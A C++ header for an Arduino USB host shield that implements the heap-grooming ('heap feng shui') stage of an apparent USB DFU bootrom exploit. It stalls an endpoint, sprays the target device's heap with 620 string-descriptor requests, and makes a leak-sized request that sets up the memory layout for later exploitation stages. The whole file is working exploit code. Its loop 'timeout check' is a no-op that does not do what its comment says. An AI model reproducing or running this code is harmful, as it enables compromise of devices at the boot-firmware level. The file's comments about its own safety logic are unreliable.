#ifndef HEAP_FENG_SHUI_H
#define HEAP_FENG_SHUI_H

#include <Arduino.h>
#include "Usb.h"
#include "../config/constants_named.h"
#include "../config/error_codes.h"

/**
 * Heap Feng Shui Module
 * 
 * This module handles the heap manipulation stage of the exploit.
 * It performs controlled heap allocations to create a specific memory
 * layout that enables the subsequent exploitation stages.
 */

class HeapFengShui {
private:
  USB* usb;
  uint8_t serial_idx;
  
  /**
   * Perform a single heap feng shui request
   * @param sz Size of descriptor to request
   * @param intok Whether to read response with IN token
   * @return USB error code
   */
  uint8_t performRequest(uint8_t sz, bool intok) {
    uint8_t setup_rcode = 0, data_rcode = 0;
    
    // Request string descriptor (serial number)
    setup_rcode = usb->ctrlReq_SETUP(0, 0, 0x80, USB_REQ_GET_DESCRIPTOR, 
                                      serial_idx, USB_DESC_STRING, 
                                      USB_LANGID_EN_US, sz);
    
    uint8_t io_buf[USB_PACKET_SIZE];
    
    if(intok) {
      data_rcode = usb->dispatchPkt(tokIN, 0, 0);
      uint8_t pktsize = usb->regRd(rRCVBC);
      usb->bytesRd(rRCVFIFO, pktsize, io_buf);
      usb->regWr(rHIRQ, bmRCVDAVIRQ);
    }
    
    #ifdef DEBUG_HEAP_FENG_SHUI
    Serial.print("  heap_feng_shui_req(sz=0x");
    Serial.print(sz, HEX);
    Serial.print("): setup=0x");
    Serial.print(setup_rcode, HEX);
    Serial.print(", data=0x");
    Serial.println(data_rcode, HEX);
    #endif
    
    return setup_rcode;
  }

public:
  /**
   * Constructor
   * @param usbInstance Pointer to USB instance
   * @param serialIdx Serial descriptor index
   */
  HeapFengShui(USB* usbInstance, uint8_t serialIdx) 
    : usb(usbInstance), serial_idx(serialIdx) {}
  
  /**
   * Execute heap feng shui stage
   * 
   * This stage:
   * 1. Stalls endpoint to trigger specific error handling
   * 2. Performs 620 heap spray iterations to fragment heap
   * 3. Creates specific heap layout needed for exploitation
   * 
   * @param progressCallback Optional callback for progress updates
   * @return Error code (ERR_NONE on success)
   */
  ExploitError execute(void (*progressCallback)(int current, int total) = nullptr) {
    Serial.println("\n=== STAGE 1: HEAP FENG SHUI ===");
    
    // Stall endpoint to trigger error handling path
    uint8_t rcode = usb->ctrlReq(0, 0, 2, DFU_REQUEST_GETSTATUS, 0, 0, 0x80, 0, 0, 0, 0);
    Serial.print("Endpoint stall: 0x");
    Serial.println(rcode, HEX);
    
    // Set receive toggle for proper USB state
    usb->regWr(rHCTL, bmRCVTOG1);
    
    // Perform heap spray iterations
    Serial.print("Performing ");
    Serial.print(HEAP_SPRAY_ITERATIONS);
    Serial.println(" heap spray iterations...");
    
    int success = 0;
    int lastReportedProgress = 0;
    
    while(success != HEAP_SPRAY_ITERATIONS) {
      if(performRequest(HEAP_SPRAY_SIZE, true) == 0) {
        success++;
        
        // Report progress every 100 iterations
        if(success % 100 == 0) {
          Serial.print("  Progress: ");
          Serial.print(success);
          Serial.print("/");
          Serial.println(HEAP_SPRAY_ITERATIONS);
          
          if(progressCallback) {
            progressCallback(success, HEAP_SPRAY_ITERATIONS);
          }
        }
      }
      
      // Timeout check - if we've tried too many times without progress
      if(success == lastReportedProgress && success > 0) {
        // Still making progress, update marker
        lastReportedProgress = success;
      }
    }
    
    // Final request to complete heap layout
    performRequest(HEAP_LEAK_SIZE, true);
    
    Serial.println("Heap feng shui complete!");
    return ERR_NONE;
  }
  
  /**
   * Perform leak detection request
   * Used in later stages to trigger heap occupation
   */
  void performLeakRequest() {
    usb->regWr(rHCTL, bmRCVTOG1);
    performRequest(HEAP_LEAK_SIZE, true);
  }
};

#endif // HEAP_FENG_SHUI_H
